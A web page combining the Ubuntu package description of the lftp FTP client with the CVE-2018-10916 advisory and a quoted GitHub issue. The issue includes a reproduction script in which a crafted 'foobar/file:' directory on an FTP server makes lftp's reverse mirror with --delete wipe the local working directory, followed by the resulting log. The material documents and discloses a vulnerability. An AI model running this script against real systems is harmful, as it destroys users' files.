[lftp](/ubuntu/precise/%2Bpackage/lftp):
Sophisticated command-line FTP/HTTP client programs

Lftp is a file retrieving tool that supports FTP, HTTP, FISH, SFTP, HTTPS

 and FTPS protocols under both IPv4 and IPv6. Lftp has an amazing set of

 features, while preserving its interface as simple and easy as possible.

 .

 The main two advantages over other ftp clients are reliability and ability

 to perform tasks in background. It will reconnect and reget the file being

 transferred if the connection broke. You can start a transfer in background

 and continue browsing on the ftp site. It does this all in one process. When

 you have started background jobs and feel you are done, you can just exit

 lftp and it automatically moves to nohup mode and completes the transfers.

 It has also such nice features as reput and mirror. It can also download a

 file as soon as possible by using several connections at the same time.

 .

 Lftp can also be scriptable, it can be used to mirror sites, it lets you

 copy files among remote servers (even between FTP and HTTP). It has an

 extensive online help. It supports bookmarks, and connecting to several

 ftp/http sites at the same time.

 .

 This package also includes lftpget - A simple non-interactive

 tool for downloading files.

# CVE-2018-10916

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2018-10915.html) [[Index]](index.html) [[Next]](CVE-2018-10918.html)

### Upstream information

[CVE-2018-10916 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10916)

#### Description

It has been discovered that lftp up to and including version 4.8.3 does not properly sanitize remote file names, leading to a loss of integrity on the local system when reverse mirroring is used. A remote attacker may trick a user to use reverse mirroring on an attacker controlled FTP server, resulting in the removal of all files in the current working directory of the victim's system.

## Description

[![@tomsommer](https://avatars.githubusercontent.com/u/149171?u=734530aa777ed320c1dfe1a607fc26ab9ea2ba2f&v=4&size=48)](/tomsommer)[tomsommer](https://github.com/tomsommer)opened [on May 16, 2018](https://github.com/lavv17/lftp/issues/452#issue-323638515)

Warning: This will delete local content on the server you are running the commands from

1. Create a directory called `foobar/file:` on any FTP server
2. Run an lftp reverse mirror command with `--delete` towards this server, where `foobar/file:` does not exist on the local source.
3. Watch as lftp deletes the cwd on the sourceserver. If you run the lftp command in `/` as `root`, that means the entire server will be wiped.

Script to reproduce:

```
mkdir -p /var/tmp/ilovethisdir/
touch ilovethisfile
cd /var/tmp/ilovethisdir/
mkdir -p /var/tmp/lftptest/foobar/
/usr/local/bin/lftp -d -c 'debug 10; set ftp:ssl-allow 0; open -u example.com,"somepassword" example.com; mkdir -p foobar/file:/ls_/'
/usr/local/bin/lftp -d -c 'debug 10; set ftp:ssl-allow 0; open -u example.com,"somepassword" example.com; mirror --verbose=3 --delete --reverse /var/tmp/lftptest /;'
ls -l /var/tmp/ilovethisdir/

```

From log:

```
Removing old directory `foobar/file:'
---- local cwd is `/var/tmp/ilovethisdir'
---- remove(/var/tmp/ilovethisdir/.)
**** .: Invalid argument
rm: Access failed: .: Invalid argument

```
